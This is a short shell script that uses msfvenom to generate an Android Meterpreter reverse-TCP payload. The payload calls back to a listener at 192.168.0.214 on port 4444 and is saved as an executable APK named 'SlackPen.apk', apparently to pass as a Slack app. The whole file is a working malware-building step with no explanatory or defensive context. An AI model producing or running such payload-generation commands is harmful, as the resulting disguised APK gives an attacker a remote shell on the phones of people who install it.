#!/bin/sh
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST="192.168.0.214" LPORT=4444 R > SlackPen.apk
sudo chmod +x SlackPen.apk
